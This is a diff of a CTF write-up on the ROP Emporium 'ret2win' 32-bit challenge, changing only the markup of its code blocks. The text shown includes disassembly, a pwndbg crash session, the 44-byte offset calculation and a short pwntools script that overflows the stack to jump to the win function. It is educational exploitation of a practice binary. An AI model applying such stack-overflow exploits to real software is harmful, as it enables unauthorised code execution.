@@ -25,7 +25,8 @@ Seems pretty easy.
 Since this chal is pretty straightforward, let's
 start with the 32 bit one.
 `objdump` tells us there is a `ret2win` function:
-{% highlight nasm%}
+
+```nasm
 080485f6 <pwnme>:
  80485f6:       55                      push   ebp
  80485f7:       89 e5                   mov    ebp,esp
@@ -52,7 +53,7 @@ start with the 32 bit one.
  804867f:       90                      nop
  8048680:       c9                      leave
  8048681:       c3                      ret
-{% endhighlight %}
+```
 
 This is basically a `cat flag.txt` which needs to be jumped to.  
 Let's run this:
@@ -72,7 +73,7 @@ Let's do it:
 
 <!--![](/assets/write-ups/ropemporium/ret2win/pwndbg.png)-->
 
-{% highlight nasm%}
+```nasm
 $ pwndbg ./ret2win32
 Reading symbols from ./ret2win32...(no debugging symbols found)...done.
 pwndbg: loaded 177 commands. Type pwndbg [filter] for a list.
@@ -125,7 +126,7 @@ Invalid address 0x6161616c
 Program received signal SIGSEGV (fault address 0x6161616c)
 pwndbg>
 
-{% endhighlight %}
+```
 
 Find the offset to overwrite the saved `eip`:
 
@@ -136,7 +137,7 @@ cyclic -l 0x6161616c
 
 And write the corresponding address of our `ret2win` function (`0x08048659`) after the 44 byte padding:
 
-{% highlight python %}
+```python
 from pwn import *
 context.update(arch='i386', os='linux')
 
@@ -153,7 +154,7 @@ with open('solve.txt', 'w') as f:
 # p = process(binary)
 # p.send(cyclic(44) + p32(win))
 # p.interactive()
-{% endhighlight %}
+```
 
 And finally get the flag:
 
